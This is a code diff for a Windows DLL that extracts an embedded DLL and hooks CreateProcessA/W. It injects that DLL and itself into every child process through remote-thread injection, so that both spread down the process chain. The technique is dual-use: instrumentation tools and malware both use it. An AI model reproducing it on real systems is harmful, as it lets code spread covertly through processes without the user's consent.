@@ -1,6 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
-#include <shlwapi.h> // For PathRemoveFileSpecA
+#include <shlwapi.h> // For PathRemoveFileSpecA/W and PathAppendA/W
 #include "dll_name.h"
 #include "dll_include.h"
 #include "../../common/shared.h"
@@ -24,6 +24,8 @@ struct HOOK_INFO {
 // Function prototypes
 BOOL InstallHook(struct HOOK_INFO *pHook, LPVOID pTarget, LPVOID pDetour);
 BOOL UninstallHook(struct HOOK_INFO *pHook);
+void InjectDll(HANDLE hProcess, const char* dllPath);
+void InjectDllW(HANDLE hProcess, const wchar_t* dllPath);
 
 // Detour function prototypes
 BOOL WINAPI DetourCreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
@@ -69,6 +71,32 @@ BOOL UninstallHook(struct HOOK_INFO *pHook) {
     return TRUE;
 }
 
+void InjectDll(HANDLE hProcess, const char* dllPath) {
+    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    if (remoteMem) {
+        WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL);
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMem, 0, NULL);
+        if (hThread) {
+            WaitForSingleObject(hThread, INFINITE);
+            CloseHandle(hThread);
+        }
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+    }
+}
+
+void InjectDllW(HANDLE hProcess, const wchar_t* dllPath) {
+    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
+    if (remoteMem) {
+        WriteProcessMemory(hProcess, remoteMem, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), NULL);
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, remoteMem, 0, NULL);
+        if (hThread) {
+            WaitForSingleObject(hThread, INFINITE);
+            CloseHandle(hThread);
+        }
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+    }
+}
+
 BOOL WINAPI DetourCreateProcessA(
     LPCSTR                lpApplicationName,
     LPSTR                 lpCommandLine,
@@ -92,20 +120,20 @@ BOOL WINAPI DetourCreateProcessA(
     );
 
     if (result) {
-        char dllPath[MAX_PATH];
+        char propagatorPath[MAX_PATH];
+        char childDllPath[MAX_PATH];
         HMODULE hModule;
+
         if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)DetourCreateProcessA, &hModule)) {
-            GetModuleFileNameA(hModule, dllPath, sizeof(dllPath));
-            LPVOID remoteMem = VirtualAllocEx(lpProcessInformation->hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
-            if (remoteMem) {
-                WriteProcessMemory(lpProcessInformation->hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL);
-                HANDLE hThread = CreateRemoteThread(lpProcessInformation->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMem, 0, NULL);
-                if (hThread) {
-                    WaitForSingleObject(hThread, INFINITE);
-                    CloseHandle(hThread);
-                }
-                VirtualFreeEx(lpProcessInformation->hProcess, remoteMem, 0, MEM_RELEASE);
-            }
+            GetModuleFileNameA(hModule, propagatorPath, sizeof(propagatorPath));
+            
+            strcpy(childDllPath, propagatorPath);
+            PathRemoveFileSpecA(childDllPath);
+            PathAppendA(childDllPath, PROPAGATED_DLL_NAME);
+
+            // Inject the child DLL first, then the propagator to continue the chain.
+            InjectDll(lpProcessInformation->hProcess, childDllPath);
+            InjectDll(lpProcessInformation->hProcess, propagatorPath);
         }
         ResumeThread(lpProcessInformation->hThread);
     }
@@ -137,20 +165,20 @@ BOOL WINAPI DetourCreateProcessW(
     );
 
     if (result) {
-        wchar_t dllPath[MAX_PATH];
+        wchar_t propagatorPath[MAX_PATH];
+        wchar_t childDllPath[MAX_PATH];
         HMODULE hModule;
+
         if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)DetourCreateProcessW, &hModule)) {
-            GetModuleFileNameW(hModule, dllPath, sizeof(dllPath) / sizeof(wchar_t));
-            LPVOID remoteMem = VirtualAllocEx(lpProcessInformation->hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
-            if (remoteMem) {
-                WriteProcessMemory(lpProcessInformation->hProcess, remoteMem, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), NULL);
-                HANDLE hThread = CreateRemoteThread(lpProcessInformation->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, remoteMem, 0, NULL);
-                if (hThread) {
-                    WaitForSingleObject(hThread, INFINITE);
-                    CloseHandle(hThread);
-                }
-                VirtualFreeEx(lpProcessInformation->hProcess, remoteMem, 0, MEM_RELEASE);
-            }
+            GetModuleFileNameW(hModule, propagatorPath, sizeof(propagatorPath) / sizeof(wchar_t));
+            
+            wcscpy(childDllPath, propagatorPath);
+            PathRemoveFileSpecW(childDllPath);
+            PathAppendW(childDllPath, PROPAGATED_DLL_NAME_W);
+
+            // Inject the child DLL first, then the propagator to continue the chain.
+            InjectDllW(lpProcessInformation->hProcess, childDllPath);
+            InjectDllW(lpProcessInformation->hProcess, propagatorPath);
         }
         ResumeThread(lpProcessInformation->hThread);
     }
@@ -179,24 +207,16 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
                     write_resource_to_file(targetPath, CHILD_START, CHILD_END);
                 }
 
-                // Load the extracted DLL
+                // Load the extracted DLL into the current process
                 LoadLibraryA(targetPath);
-
-                // Mark for deletion on close (optional, but good for temporary files)
-                // This will delete the file when the last handle to it is closed.
-                // However, if the process crashes, the file might remain.
-                // A more robust solution might involve a separate cleanup mechanism.
-                // For now, let's keep it simple.
-                // DeleteFileA(targetPath); // Don't delete immediately, as it's still in use.
             }
+            // Install hooks for child processes
             InstallHook(&g_CreateProcessAHook, GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA"), DetourCreateProcessA);
             InstallHook(&g_CreateProcessWHook, GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessW"), DetourCreateProcessW);
             break;
         case DLL_PROCESS_DETACH:
             UninstallHook(&g_CreateProcessAHook);
             UninstallHook(&g_CreateProcessWHook);
-            // Consider deleting the extracted DLL here if it's safe to do so.
-            // This is tricky because other processes might still be using it.
             break;
     }
     return TRUE;
